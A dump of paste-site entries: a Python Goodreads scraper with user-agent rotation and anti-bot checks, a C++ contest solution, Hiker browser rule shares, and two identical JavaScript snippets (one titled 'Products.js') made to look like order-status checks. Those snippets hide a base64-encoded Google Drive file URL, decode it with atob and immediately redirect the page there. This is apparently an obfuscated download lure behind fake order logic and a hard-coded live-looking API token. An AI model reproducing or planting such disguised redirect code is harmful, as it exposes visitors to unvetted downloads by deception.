        )
        
        if description_el:
            return description_el.text.strip()
        else:
            book_desc_section = soup.find('div', id='descriptionContainer')
            if book_desc_section:
                return book_desc_section.text.strip()
            return ""No description found on page""
            
    except Exception as e:
        return f""Error fetching description: {e}""

# Main execution
print(""Starting Goodreads Best Books scraper..."")
books = scrape_goodreads_best_books(num_pages=3)  # Scrape 3 pages

# Create DataFrame
df = pd.DataFrame(books)

# Sort by rank to ensure proper order
df = df.sort_values('rank')

# Fetch descriptions for all books
print(""\nFetching descriptions for all books..."")
for i, book in enumerate(df.to_dict('records')):
    try:
        print(f""Fetching description for #{book['rank']}: {book['title']}"")
        description = get_book_description(book['temp_url'])
        truncated_description = description[:100] + ""..."" if len(description) > 100 else description
        df.loc[df['rank'] == book['rank'], 'description'] = truncated_description
        time.sleep(random.uniform(0.5, 1.5))  # Add delay between requests
    except Exception as e:
        print(f""Error fetching description for book #{book['rank']}: {e}"")

# Remove the temporary URL column
df = df.drop(columns=['temp_url'])

# Display analysis
if not df.empty:
    print(""\n=== ANALYSIS ==="")
    
    # Find highest rated book
    highest_rated = df.loc[df['avg_rating'].idxmax()]
    print(f""Book with highest average rating ({highest_rated['avg_rating']}):"")
    print(f""Title: {highest_rated['title']}"")
    print(f""Author: {highest_rated['author']}"")
    print(f""Rank: {highest_rated['rank']}"")
    print(f""Score: {highest_rated['score']:,}"")  # Format with commas
    if highest_rated['description']:
        print(f""Description: {highest_rated['description']}"")
    
    # Find highest score book
    if df['score'].max() > 0:
        highest_score = df.loc[df['score'].idxmax()]
        print(""\nBook with highest score ({:,}):"".format(highest_score['score']))
        print(f""Title: {highest_score['title']}"")
        print(f""Author: {highest_score['author']}"")
        print(f""Rank: {highest_score['rank']}"")
        print(f""Average Rating: {highest_score['avg_rating']}"")
        if highest_score['description']:
            print(f""Description: {highest_score['description']}"")
        
        print(""\nAre they the same book?"", ""Yes"" if highest_rated['rank'] == highest_score['rank'] else ""No"")
    else:
        print(""\nCould not determine highest score book as all scores are 0"")
    
    # Save to files
    df.to_csv(""goodreads_top_books_final.csv"", index=False)
else:
    print(""No books were collected"")"
raXMn59S,gr scrape good but not fiull desc,STANAANDREY,Python,Tuesday 8th of April 2025 10:41:55 AM CDT,"import requests
from bs4 import BeautifulSoup
import pandas as pd
import re
import time
import random

def scrape_goodreads_best_books(num_pages=3):
    all_books = []
    base_url = ""https://www.goodreads.com/list/show/1.Best_Books_Ever""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ]
    
    for page in range(1, num_pages + 1):
        if page == 1:
            url = base_url
        else:
            url = f""{base_url}?page={page}""
        
        print(f""Scraping page {page}: {url}"")
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        if page > 1:
            delay = random.uniform(2, 5)
            print(f""Waiting {delay:.2f} seconds before next request..."")
            time.sleep(delay)
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            print(f""Response status code: {response.status_code}"")
            
            if response.status_code != 200:
                print(f""Failed to retrieve page {page}. Stopping."")
                break
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if we're being blocked
            title = soup.title.text if soup.title else ""No title found""
            if ""robot"" in title.lower() or ""captcha"" in title.lower() or ""blocked"" in title.lower():
                print(f""Detected anti-bot measures on page {page}. Stopping."")
                break
            
            # Find all book entries on the page
            book_elements = soup.select(""table.tableList tr"")
            print(f""Found {len(book_elements)} books on page {page}"")
            
            # Save the HTML for debugging
            if page == 1:
                with open(""goodreads_page.html"", ""w"", encoding=""utf-8"") as f:
                    f.write(response.text)
                print(""Saved first page HTML for debugging"")
            
            # Calculate base ranking for this page
            base_rank = (page - 1) * 100
            
            # Extract data for each book
            for i, book in enumerate(book_elements):
                try:
                    # Calculate ranking
                    rank = base_rank + i + 1
                    
                    # Extract title and URL
                    title_el = book.select_one("".bookTitle"")
                    title = title_el.text.strip() if title_el else ""Unknown Title""
                    
                    # Extract book URL
                    book_url = None
                    if title_el and title_el.get('href'):
                        book_url = f""https://www.goodreads.com{title_el.get('href')}""
                    
                    # Extract author
                    author_el = book.select_one("".authorName"")
                    author = author_el.text.strip() if author_el else ""Unknown Author""
                    
                    # Extract rating
                    rating_el = book.select_one("".minirating"")
                    rating_text = rating_el.text.strip() if rating_el else """"
                    rating_match = re.search(r'(\d+\.\d+)', rating_text)
                    avg_rating = float(rating_match.group(1)) if rating_match else None
                    
                    # Extract score - try multiple approaches
                    score = 0
                    
                    # First approach: look for text with ""score:"" in it
                    score_elements = book.select("".smallText"")
                    for el in score_elements:
                        text = el.text.strip()
                        if ""score:"" in text.lower():
                            score_match = re.search(r'score:\s*([\d,]+)', text, re.IGNORECASE)
                            if score_match:
                                score = int(score_match.group(1).replace(',', ''))
                                break
                    
                    # Second approach: look for vote count
                    if score == 0:
                        vote_elements = book.select("".greyText"")
                        for el in vote_elements:
                            text = el.text.strip()
                            vote_match = re.search(r'([\d,]+)\s+people voted', text)
                            if vote_match:
                                score = int(vote_match.group(1).replace(',', ''))
                                break
                    
                    # Third approach: directly extract from the page structure
                    if score == 0 and i == 0 and page == 1:  # For debugging the first book
                        print(f""DEBUG - Book HTML: {book}"")
                        all_text = book.get_text()
                        print(f""DEBUG - All text: {all_text}"")
                    
                    # Create book entry
                    book_data = {
                        ""rank"": rank,
                        ""title"": title,
                        ""author"": author,
                        ""avg_rating"": avg_rating,
                        ""score"": score,
                        ""url"": book_url
                    }
                    
                    all_books.append(book_data)
                    
                except Exception as e:
                    print(f""Error extracting book {i+1} on page {page}: {e}"")
            
        except Exception as e:
            print(f""Error processing page {page}: {e}"")
    
    print(f""Total books collected: {len(all_books)}"")
    return all_books

def get_book_description(book_url):
    """"""Fetch the book description from its detail page""""""
    if not book_url:
        return ""No description available""
    
    try:
        time.sleep(random.uniform(1, 3))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        }
        
        response = requests.get(book_url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return ""Failed to retrieve description""
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try different selectors for description
        description_el = (
            soup.select_one(""#description span[style='display:none']"") or
            soup.select_one(""#description span"") or
            soup.select_one("".DetailsLayoutRightParagraph__widthConstrained"") or
            soup.select_one(""[data-testid='description']"") or
            soup.select_one(""#description"")
        )
        
        if description_el:
            return description_el.text.strip()
        else:
            book_desc_section = soup.find('div', id='descriptionContainer')
            if book_desc_section:
                return book_desc_section.text.strip()
            return ""No description found on page""
            
    except Exception as e:
        return f""Error fetching description: {e}""

# Let's try a different approach - manually extract scores from the page
def extract_scores_from_page(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }
    
    response = requests.get(url, headers=headers, timeout=30)
    if response.status_code != 200:
        return {}
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all vote count elements
    scores = {}
    book_elements = soup.select(""table.tableList tr"")
    
    for i, book in enumerate(book_elements):
        rank = i + 1
        
        # Try to find the vote count text
        vote_text = None
        
        # Look for the specific pattern in the HTML
        for div in book.select(""div.uitext""):
            text = div.text.strip()
            if ""people voted"" in text:
                vote_text = text
                break
        
        if vote_text:
            vote_match = re.search(r'([\d,]+)\s+people voted', vote_text)
            if vote_match:
                score = int(vote_match.group(1).replace(',', ''))
                scores[rank] = score
    
    return scores

# Main execution
print(""Starting Goodreads Best Books scraper..."")
books = scrape_goodreads_best_books(num_pages=3)

# Create DataFrame
df = pd.DataFrame(books)

# Sort by rank to ensure proper order
df = df.sort_values('rank')

# Try to extract scores directly from the pages
print(""\nExtracting scores from pages..."")
page1_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever"")
page2_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever?page=2"")
page3_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever?page=3"")

# Update scores in the DataFrame
for rank, score in page1_scores.items():
    df.loc[df['rank'] == rank, 'score'] = score

for rank, score in page2_scores.items():
    df.loc[df['rank'] == (rank + 100), 'score'] = score

for rank, score in page3_scores.items():
    df.loc[df['rank'] == (rank + 200), 'score'] = score

# Get descriptions for top 10 books
if not df.empty:
    print(""\nFetching descriptions for top 10 books..."")
    df['description'] = None  # Initialize description column
    
    # Get top 10 books
    top_10 = df.head(10)
    
    for idx, book in top_10.iterrows():
        print(f""Fetching description for #{book['rank']}: {book['title']}"")
        description = get_book_description(book['url'])
        df.at[idx, 'description'] = description
    
    # Find highest rated book
    highest_rated = df.loc[df['avg_rating'].idxmax()]
    if highest_rated['rank'] > 10:  # If not already in top 10
        print(f""\nFetching description for highest rated book: {highest_rated['title']}"")
        highest_rated_desc = get_book_description(highest_rated['url'])
        df.loc[df['rank'] == highest_rated['rank'], 'description'] = highest_rated_desc
    
    # Find highest score book
    if df['score'].max() > 0:  # Only if we have valid scores
        highest_score = df.loc[df['score'].idxmax()]
        if highest_score['rank'] > 10:  # If not already in top 10
            print(f""Fetching description for highest score book: {highest_score['title']}"")
            highest_score_desc = get_book_description(highest_score['url'])
            df.loc[df['rank'] == highest_score['rank'], 'description'] = highest_score_desc
    
    # Display analysis
    print(""\n=== ANALYSIS ==="")
    print(f""Book with highest average rating ({highest_rated['avg_rating']}):"")
    print(f""Title: {highest_rated['title']}"")
    print(f""Author: {highest_rated['author']}"")
    print(f""Rank: {highest_rated['rank']}"")
    print(f""Score: {highest_rated['score']}"")
    print(""Description:"")
    highest_rated_desc = df.loc[df['rank'] == highest_rated['rank'], 'description'].values[0]
    print(highest_rated_desc[:500] + ""..."" if highest_rated_desc and len(highest_rated_desc) > 500 else highest_rated_desc)
    
    # Find highest score book for analysis
    if df['score'].max() > 0:
        highest_score = df.loc[df['score'].idxmax()]
        print(""\nBook with highest score ({:,}):"".format(highest_score['score']))
        print(f""Title: {highest_score['title']}"")
        print(f""Author: {highest_score['author']}"")
        print(f""Rank: {highest_score['rank']}"")
        print(f""Average Rating: {highest_score['avg_rating']}"")
        print(""Description:"")
        highest_score_desc = df.loc[df['rank'] == highest_score['rank'], 'description'].values[0]
        print(highest_score_desc[:500] + ""..."" if highest_score_desc and len(highest_score_desc) > 500 else highest_score_desc)
        
        print(""\nAre they the same book?"", ""Yes"" if highest_rated['rank'] == highest_score['rank'] else ""No"")
    else:
        print(""\nCould not determine highest score book as all scores are 0"")
    
    # Save to files
    df.to_csv(""goodreads_top_books.csv"", index=False)
    df.to_excel(""goodreads_top_books.xlsx"", index=False)
    print(""\nResults saved to goodreads_top_books.csv and goodreads_top_books.xlsx"")
else:
    print(""No books were collected"")"
qigY6UP6,Untitled,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:35:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34869/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3ADPqL7Z,混乘数字 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 10:33:34 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
int ans;
LL p[20];

LL getHash(int x, int y) {
    LL ret = 0;
    while (x != 0) {
        ret += p[x % 10];
        x /= 10;
    }
    while (y != 0) {
        ret += p[y % 10];
        y /= 10;
    }
    return ret;
}

bool judge(int x) {
    LL xHash = getHash(x, 0);
    for (int i = 2; i <= x / i; ++i) {
        if (x % i == 0) {
            if (getHash(i, x / i) == xHash) {
                return true;
            }
        }
    }
    return false;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    p[0] = 1;
    for (int i = 1; i < 10; ++i) {
        p[i] = p[i - 1] * 10;
    }
    for (int i = 1; i <= 1000000; ++i) {
        if (judge(i)) {
            ++ans;
        }
    }
    cout << ans << endl;
//    cout << 590 << endl;

    return 0;
}
"
AM4KvkUq,Products.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:20:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86549/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hi16ZYxY,邀您一起看：主页设置-主题管理-⤻分享,xiaomianao666,JavaScript,Tuesday 8th of April 2025 10:15:01 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-主题管理-⤻分享@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG5pbmRleCA9PiB7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJleHBvcnRcXFwiLCBpbmRleCk7XFxufVxcbikoXFxcIjFcXFwiKVwiLFwiZ3JvdXBcIjpcIlwifSIsInRpdGxlIjoi5Li76aG16K6+572uLeS4u+mimOeuoeeQhi3ipLvliIbkuqsifQ==
5XdnXqdf,邀您一起看：主页设置-主题管理-⤻分享,xiaomianao666,JavaScript,Tuesday 8th of April 2025 10:14:47 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-主题管理-⤻分享@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG5pbmRleCA9PiB7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJleHBvcnRcXFwiLCBpbmRleCk7XFxufVxcbikoXFxcIjBcXFwiKVwiLFwiZ3JvdXBcIjpcIlwifSIsInRpdGxlIjoi5Li76aG16K6+572uLeS4u+mimOeuoeeQhi3ipLvliIbkuqsifQ==
